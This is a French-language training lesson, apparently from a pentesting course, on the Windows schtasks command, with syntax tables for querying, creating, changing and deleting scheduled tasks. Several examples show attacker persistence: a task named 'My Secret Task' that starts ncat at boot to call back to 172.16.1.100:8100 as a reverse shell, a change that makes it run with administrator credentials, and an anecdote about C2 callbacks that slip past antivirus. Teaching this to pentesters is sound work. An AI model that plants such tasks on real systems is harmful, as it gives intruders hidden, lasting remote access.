[[Command Prompt Basics]]
Les tâches planifiées sont un excellent moyen pour les administrateurs de s'assurer que les tâches qu'ils souhaitent exécuter régulièrement le sont, mais elles constituent également un excellent point de persistance (persistence) pour les attaquants. Dans cette section, nous aborderons l'utilisation de schtasks pour :

- Apprendre à vérifier quelles tâches existent.
- Créer une nouvelle tâche pour nous aider à automatiser des actions ou à obtenir un shell sur l'hôte.

---

## Que sont les tâches planifiées ?

Le Planificateur de tâches nous permet, en tant qu'administrateurs, d'effectuer des tâches de routine sans avoir à les lancer manuellement. Le planificateur surveillera l'hôte pour un ensemble de conditions spécifiques appelées déclencheurs (triggers) et exécutera la tâche une fois que les conditions seront remplies.

**Petite histoire : lors de plusieurs missions de pentesting dans un environnement d'entreprise, je me suis retrouvé dans une situation où j'avais atterri sur un hôte et avais besoin d'un moyen rapide d'établir une persistance. Au lieu de faire quelque chose de fou ou de télécharger un autre exécutable sur l'hôte, j'ai décidé de rechercher ou de créer une tâche planifiée qui s'exécute lorsqu'un utilisateur se connecte ou que l'hôte redémarre. Dans cette tâche planifiée, je définirais un déclencheur pour ouvrir un nouveau socket via PowerShell, contactant mon infrastructure de Commande et Contrôle (Command and Control). Cela garantirait que je pourrais revenir si je perdais l'accès à cet hôte. Si j'avais de la chance, lorsque la tâche que j'avais choisie s'exécutait, je pouvais aussi recevoir en retour un shell de niveau SYSTEM, élevant mes privilèges par la même occasion. Cela assurait rapidement l'accès à l'hôte sans déclencher d'alarmes auprès des antivirus ou des systèmes de prévention des pertes de données (data loss prevention).**

#### Déclencheurs pouvant lancer une tâche planifiée

- Lorsqu'un événement système spécifique se produit.
- À une heure spécifique.
- À une heure spécifique selon une planification quotidienne.
- À une heure spécifique selon une planification hebdomadaire.
- À une heure spécifique selon une planification mensuelle.
- À une heure spécifique selon une planification mensuelle par jour de la semaine.
- Lorsque l'ordinateur entre en état d'inactivité.
- Lorsque la tâche est enregistrée.
- Lorsque le système est démarré.
- Lorsqu'un utilisateur se connecte.
- Lorsqu'une session Terminal Server change d'état.

Cette liste de déclencheurs est longue et nous offre de nombreuses options pour qu'une tâche entre en action. Maintenant que nous savons ce que sont les tâches planifiées et ce qui peut les rendre actionnables, il est temps de voir comment les utiliser.

---

## Comment utiliser Schtasks

Dans les sections ci-dessous, nous allons voir en détail comment nous pouvons utiliser la commande `schtasks` au maximum de ses capacités. De plus, à mesure que nous les examinerons plus en détail, un tableau formaté fournissant la syntaxe pour chaque action sera fourni.

Notez que les sections fournies ici ne constituent pas une liste exhaustive. Plusieurs des paramètres répétitifs ont été omis. Assurez-vous de consulter le menu d'aide `/?` pour voir une liste complète de ce qui peut être utilisé.

#### Afficher les tâches planifiées :

#### Syntaxe de Query

|**Action**|**Paramètre**|**Description**|
|---|---|---|
|`Query`||Effectue une recherche sur l'hôte local ou distant pour déterminer quelles tâches planifiées existent. En raison des permissions, toutes les tâches peuvent ne pas être visibles par un utilisateur normal.|
||/fo|Définit les options de formatage. Nous pouvons spécifier d'afficher les résultats en format `Table`, `List` ou `CSV`.|
||/v|Active la verbosité, affichant les `propriétés avancées` définies dans les tâches affichées lorsqu'il est utilisé avec le paramètre de sortie List ou CSV.|
||/nh|Simplifie la sortie en utilisant le format de sortie Table ou CSV. Ce commutateur `supprime` les `en-têtes de colonne`.|
||/s|Définit le nom DNS ou l'adresse IP de l'hôte auquel nous voulons nous connecter. `Localhost` est la `valeur par défaut`. Si `/s` est utilisé, nous nous connectons à un hôte distant et devons le formater comme suit : "\\hôte".|
||/u|Ce commutateur indiquera à schtasks d'exécuter la commande suivante avec l' `ensemble de permissions` de l' `utilisateur` spécifié.|
||/p|Définit le `mot de passe` utilisé pour l'exécution de la commande lorsque nous spécifions un utilisateur pour exécuter la tâche. Les utilisateurs doivent être membres du groupe Administrateurs sur l'hôte (ou dans le domaine). Les valeurs `u` et `p` ne sont valides que lorsqu'elles sont utilisées avec le paramètre `s`.|

Nous pouvons afficher les tâches qui existent déjà sur notre hôte en utilisant la commande `schtasks` comme suit :

        cmd
`C:\htb> SCHTASKS /Query /V /FO list  Folder: \   HostName:                             DESKTOP-Victim TaskName:                             \Check Network Access Next Run Time:                        N/A Status:                               Ready Logon Mode:                           Interactive only Last Run Time:                        11/30/1999 12:00:00 AM Last Result:                          267011 Author:                               DESKTOP-Victim\htb-admin Task To Run:                          C:\Windows\System32\cmd.exe ping 8.8.8.8 Start In:                             N/A Comment:                              quick ping check to determine connectivity. If it passes, other tasks will kick off. If it fails, they will delay. Scheduled Task State:                 Enabled Idle Time:                            Disabled Power Management:                     Stop On Battery Mode, No Start On Batteries Run As User:                          tru7h Delete Task If Not Rescheduled:       Disabled Stop Task If Runs X Hours and X Mins: 72:00:00 Schedule:                             Scheduling data is not available in this format. Schedule Type:                        At system start up Start Time:                           N/A Start Date:                           N/A End Date:                             N/A Days:                                 N/A Months:                               N/A Repeat: Every:                        N/A Repeat: Until: Time:                  N/A Repeat: Until: Duration:              N/A Repeat: Stop If Still Running:        N/A  <SNIP>`

Le chaînage de nos paramètres avec `Query` nous permet de formater notre sortie, passant d'un bloc brut standard à une liste avec des paramètres avancés. La sortie ci-dessus montre à quoi ressembleraient les tâches dans un format de liste.

#### Créer une nouvelle tâche planifiée :

#### Syntaxe de Create

|**Action**|**Paramètre**|**Description**|
|---|---|---|
|`Create`||Planifie l'exécution d'une tâche.|
||/sc|Définit le type de planification. Cela peut être à la minute, à l'heure, à la semaine, et bien plus encore. Assurez-vous de vérifier les paramètres des options.|
||/tn|Définit le nom de la tâche que nous créons. Chaque tâche doit avoir un nom unique.|
||/tr|Définit le déclencheur et la tâche qui doit être exécutée. Il peut s'agir d'un exécutable, d'un script ou d'un fichier batch.|
||/s|Spécifie l'hôte sur lequel exécuter, tout comme dans Query.|
||/u|Spécifie l'utilisateur local ou l'utilisateur de domaine à utiliser.|
||/p|Définit le mot de passe de l'utilisateur spécifié.|
||/mo|Nous permet de définir un modificateur à exécuter dans notre planification définie. Par exemple, toutes les 5 heures un jour sur deux.|
||/rl|Nous permet de limiter les privilèges de la tâche. Les options ici sont l'accès `limited` (limité) et `Highest` (le plus élevé). Limited est la valeur par défaut.|
||/z|Fait en sorte que la tâche soit supprimée après l'achèvement de ses actions.|

La création d'une nouvelle tâche planifiée est assez simple. Au minimum, nous devons spécifier les éléments suivants :

- `/create` : pour lui dire ce que nous faisons
- `/sc` : nous devons définir une planification
- `/tn` : nous devons définir le nom
- `/tr` : nous devons lui donner une action à entreprendre

Tout le reste est facultatif. Voyons un exemple ci-dessous de la manière dont nous pourrions créer une tâche pour nous aider à obtenir un shell.

#### Création d'une nouvelle tâche

        cmd
`C:\htb> schtasks /create /sc ONSTART /tn "My Secret Task" /tr "C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100"  SUCCESS: The scheduled task "My Secret Task" has successfully been created.`

**Un excellent exemple d'utilisation de schtasks serait de nous fournir un callback à chaque démarrage de l'hôte. Cela garantirait que si notre shell se termine, nous obtiendrons un callback de l'hôte lors du prochain redémarrage, ce qui rend probable que nous ne perdrons l'accès à l'hôte que pour une courte période si quelque chose se produit ou si l'hôte est éteint. Nous pouvons créer ou modifier une nouvelle tâche en ajoutant un nouveau déclencheur et une nouvelle action. Dans notre tâche ci-dessus, nous faisons en sorte que schtasks exécute Ncat localement, que nous avons placé dans le répertoire AppData de l'utilisateur, et se connecte à l'hôte `172.16.1.100` sur le port `8100`. Si elle est exécutée avec succès, cette demande de connexion devrait se connecter à notre framework de commande et contrôle (Metasploit, Empire, etc.) et nous donner un accès shell.**

Maintenant, voyons à quoi ressemblerait la modification d'une tâche.

### Modifier les propriétés d'une tâche planifiée

#### Syntaxe de Change

|**Action**|**Paramètre**|**Description**|
|---|---|---|
|`Change`||Permet de modifier les tâches planifiées existantes.|
||/tn|Désigne la tâche à modifier|
||/tr|Modifie le programme ou l'action que la tâche exécute.|
||/ENABLE|Change l'état de la tâche à Activé (Enabled).|
||/DISABLE|Change l'état de la tâche à Désactivé (Disabled).|

Ok, maintenant disons que nous avons trouvé le `hash` du mot de passe de l'administrateur local et que nous voulons l'utiliser pour lancer notre shell Ncat pour nous ; si quelque chose se produit, nous pouvons modifier la tâche comme suit pour y ajouter les informations d'identification à utiliser.

        cmd
`C:\htb> schtasks /change /tn "My Secret Task" /ru administrator /rp "P@ssw0rd"  SUCCESS: The parameters of scheduled task "My Secret Task" have been changed.`

Maintenant, pour nous assurer que nos modifications ont été prises en compte, nous pouvons interroger la tâche spécifique en utilisant le paramètre `/tn` et voir :

        cmd
`C:\htb> schtasks /query /tn "My Secret Task" /V /fo list   Folder: \ HostName:                             DESKTOP-Victim TaskName:                             \My Secret Task Next Run Time:                        N/A Status:                               Ready Logon Mode:                           Interactive/Background Last Run Time:                        11/30/1999 12:00:00 AM Last Result:                          267011 Author:                               DESKTOP-victim\htb-admin Task To Run:                          C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100 Start In:                             N/A Comment:                              N/A Scheduled Task State:                 Enabled Idle Time:                            Disabled Power Management:                     Stop On Battery Mode, No Start On Batteries Run As User:                          SYSTEM Delete Task If Not Rescheduled:       Disabled Stop Task If Runs X Hours and X Mins: 72:00:00 Schedule:                             Scheduling data is not available in this format. Schedule Type:                        At system start up  <SNIP>`  

Il semble que nos modifications ont été enregistrées avec succès. La gestion des tâches et l'apport de modifications sont assez simples. Nous devons nous assurer que notre syntaxe est correcte, sinon la tâche pourrait ne pas se déclencher. Si nous voulons nous assurer qu'elle fonctionne, nous pouvons utiliser le paramètre `/run` pour lancer la tâche immédiatement. Nous avons `interrogé, créé et modifié` des tâches jusqu'à présent. Voyons maintenant comment les supprimer.

### Supprimer la ou les tâches planifiées

#### Syntaxe de Delete

|**Action**|**Paramètre**|**Description**|
|---|---|---|
|`Delete`||Supprime une tâche de la planification|
||/tn|Identifie la tâche à supprimer.|
||/s|Spécifie le nom ou l'adresse IP de l'hôte dont la tâche doit être supprimée.|
||/u|Spécifie l'utilisateur avec lequel exécuter la tâche.|
||/p|Spécifie le mot de passe pour exécuter la tâche.|
||/f|Supprime l'avertissement de confirmation.|

        cmd
`C:\htb> schtasks /delete  /tn "My Secret Task"   WARNING: Are you sure you want to remove the task "My Secret Task" (Y/N)?`

Exécuter `schtasks /delete` est assez simple. La chose à noter est que si nous ne fournissons pas l'option `/F`, nous serons invités, comme dans l'exemple ci-dessus, à fournir une entrée. L'utilisation de `/F` supprimera la tâche et masquera le message.

---

Schtasks peut être un excellent moyen de tirer parti de l'hôte pour exécuter des actions pour nous en tant qu'administrateurs et pentesters. Prenez le temps de vous entraîner à créer, modifier et supprimer des tâches. À ce stade, nous devrions être à l'aise avec `cmd.exe` et son fonctionnement. Passons au niveau supérieur et commençons à travailler avec `PowerShell`